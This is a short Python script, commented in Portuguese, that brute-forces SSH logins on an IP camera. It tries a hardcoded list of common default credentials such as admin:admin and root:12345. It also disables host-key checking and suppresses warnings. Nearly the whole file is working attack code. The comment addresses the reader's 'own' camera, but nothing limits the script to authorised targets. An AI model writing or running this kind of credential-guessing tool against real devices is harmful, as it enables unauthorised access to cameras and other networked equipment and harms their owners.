
import paramiko

# Configurações
host = "IP_DA_CAMERA"  # Substitua pelo IP da sua câmera
port = 22


# Lista ampliada de usuários e senhas comuns para câmeras IP
credentials = [
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("admin", "password"),
    ("admin", "1234"),
    ("admin", "1111"),
    ("admin", "888888"),
    ("admin", "4321"),
    ("admin", "qwerty"),
    ("admin", ""),
    ("root", "root"),
    ("root", "12345"),
    ("root", "123456"),
    ("root", "password"),
    ("root", ""),
    ("user", "user"),
    ("user", "12345"),
    ("user", "123456"),
    ("user", "password"),
    ("user", ""),
    ("guest", "guest"),
    ("guest", "12345"),
    ("guest", ""),
    ("support", "support"),
    ("support", "12345"),
    ("support", ""),
    ("admin1", "password"),
    ("administrator", "admin"),
    ("administrator", "password"),
    ("root", "toor"),
    ("root", "admin"),
    ("root", "pass"),
    ("root", "1234"),
    ("root", "1111"),
    ("root", "888888"),
    ("root", "4321"),
    ("root", "qwerty"),
]


import random
import time
import warnings
import socket

def try_ssh_login(host, port, username, password):
    client = paramiko.SSHClient()
    # Política customizada para não armazenar host key
    class FakeHostKeyPolicy(paramiko.MissingHostKeyPolicy):
        def missing_host_key(self, client, hostname, key):
            pass
    client.set_missing_host_key_policy(FakeHostKeyPolicy())
    try:
        with warnings.catch_warnings():
            warnings.simplefilter("ignore")
            client.connect(host, port=port, username=username, password=password, timeout=5, banner_timeout=3, allow_agent=False, look_for_keys=False)
        client.close()
        return True
    except (paramiko.ssh_exception.SSHException, socket.error, socket.timeout, Exception):
        print(f"Falha ou conexão recusada para {username}:{password!r}")
        return False

def main(host, port):
    print(f"\nIniciando brute force em {host}:{port} ...")
    # Embaralha a lista de credenciais para tornar o processo mais dinâmico
    cred_list = credentials.copy()
    random.shuffle(cred_list)
    for username, password in cred_list:
        print(f"Tentando {username}:{password!r}...")
        if try_ssh_login(host, port, username, password):
            print(f"SUCESSO! Credencial encontrada: {username}:{password!r}")
            return
        time.sleep(1)  # Aguarda 1 segundo entre as tentativas
    print("Nenhuma credencial funcionou.")
